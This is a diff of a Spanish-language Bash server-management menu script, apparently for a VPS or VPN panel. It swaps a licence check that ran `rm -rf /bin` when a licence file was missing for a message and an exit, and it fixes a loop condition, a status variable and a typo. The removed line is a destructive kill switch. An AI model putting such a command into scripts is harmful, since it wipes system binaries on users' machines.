@@ -210,7 +210,7 @@ menu2 (){
 stsbot=$(ps x | grep "bot_plus"|grep -v grep > /dev/null && echo -e "${verde}◉ " || echo -e "${rojo}○ ")
 stsbotteste=$(ps x | grep "bot_teste"|grep -v grep > /dev/null && echo -e "${verde}◉ " || echo -e "${rojo}○ ")
 autm=$(grep "menu;" /etc/profile > /dev/null && echo -e "${verde}◉ " || echo -e "${rojo}○ ")
-[[ ! -e /usr/lib/licence ]] && rm -rf /bin > /dev/null 2>&1
+[[ ! -e /usr/lib/licence ]] && { echo -e "\033[1;31mLicencia no encontrada\033[0m"; sleep 2; exit 1; }
 if [[ "$(grep -c "Ubuntu" /etc/issue.net)" = "1" ]]; then
 system=$(cut -d' ' -f1 /etc/issue.net)
 system+=$(echo ' ')
@@ -321,7 +321,7 @@ case "$x" in
    sleep 2
 esac
 }
-while true $x != "ok"
+while true
 do
 stsl=$(ps x | grep "limiter"|grep -v grep > /dev/null && echo -e "${verde}◉ " || echo -e "${rojo}○ ")
 pyt=$(ps x | grep "python3"|grep -v grep > /dev/null && echo -e "${verde}◉ " || echo -e "${rojo}○ ")
@@ -370,7 +370,7 @@ echo -e "
   ${v}-06-${amarillo}EDITAR LIMITE          ${v}-16- ${amarillo}Auto PYTHON3 $pyt
   ${v}-07-${amarillo}EDITAR CONTRASEÑA      ${v}-17- ${amarillo}LIMITER $stsl
   ${v}-08-${amarillo}BORRAR EXPIRADOS       ${v}-18- ${amarillo}BAD VPN $stsu         
-  ${v}-09-${amarillo}INFO DE  USUARIOS     ${v}-19- ${amarillo}LIMPIAR RAM $stson   
+  ${v}-09-${amarillo}INFO DE  USUARIOS     ${v}-19- ${amarillo}LIMPIAR RAM $stsu   
   ${v}-10-${amarillo} MENU INSTALADOR      ${v}-20-${amarillo}INFO VPS   ${fin}     
   ${r}-00-${amarillo}SALIR❌                 ${v}-21-${amarillo}Menu2 
   ${fin}${rojo}━━ HERRAMIENTAS EXTRA ━━
@@ -454,7 +454,7 @@ case "$x" in
    14)
    clear
    netstat -ntpl
-   echo -ne "\n${rojo}ENTER ${amarillo}PARA VOLVET AL ${verde}MENU!\e[0m"; read
+    echo -ne "\n${rojo}ENTER ${amarillo}PARA VOLVER AL ${verde}MENU!\e[0m"; read
    ;;
    15)
    userbackup
